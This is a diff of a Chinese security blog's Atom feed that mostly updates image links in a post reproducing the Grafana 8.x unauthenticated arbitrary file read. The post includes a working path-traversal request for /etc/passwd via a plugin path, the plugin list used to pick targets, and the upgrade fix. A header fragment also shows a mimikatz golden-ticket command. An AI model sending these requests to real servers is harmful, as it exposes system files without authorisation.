@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-02-09T05:55:25.907Z</updated>
+    <updated>2022-02-12T10:06:14.508Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
@@ -377,14 +377,13 @@ mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /kr
         </link>
         <updated>2021-12-09T03:20:11.000Z</updated>
         <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
-<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a><br>
-<img src="https://V-alkoinen.github.io/post-images/1644375120664.png" alt="" loading="lazy"></p>
+<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a></p>
 <h1 id="二-影响范围">二、影响范围</h1>
 <p>  <code>grafana 8.x</code></p>
 <h1 id="三-漏洞复现">三、漏洞复现</h1>
 <pre><code>docker run --name=grafana -d -p 80:3000 grafana/grafana:8.0.1
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644376089892.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644659742530.png" alt="" loading="lazy"></figure>
 <pre><code>GET /public/plugins/cloudwatch/../../../../../../../../../../../../etc/passwd HTTP/1.1
 Host: &lt;host&gt;
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
@@ -392,7 +391,7 @@ Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8n
 Cookie: redirect_to=%2F
 Connection: close
 </code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1644376193114.png" alt="" loading="lazy"><br>
+<p><img src="https://V-alkoinen.github.io/post-images/1644659986203.png" alt="" loading="lazy"><br>
   通过<code>/api/plugins</code>接口查看所有插件</p>
 <pre><code>GET /api/plugins HTTP/1.1
 Host: &lt;host&gt;
@@ -401,7 +400,7 @@ Accept: */*
 Cookie: grafana_session=ab39f8213543745da2f725f26b026f49
 Connection: close
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644376310734.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644660118608.png" alt="" loading="lazy"></figure>
 <pre><code>#默认插件
 alertmanager
 cloud-monitoring
@@ -457,8 +456,8 @@ xychart
 </code></pre>
 <h1 id="四-漏洞修复">四、漏洞修复</h1>
 <p>  升级<code>grafana</code>至最新版本后(Grafana v8.3.5)，无该问题。<br>
-<img src="https://V-alkoinen.github.io/post-images/1644376697803.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644376703581.png" alt="" loading="lazy"></p>
+<img src="https://V-alkoinen.github.io/post-images/1644660299071.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1644660362241.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
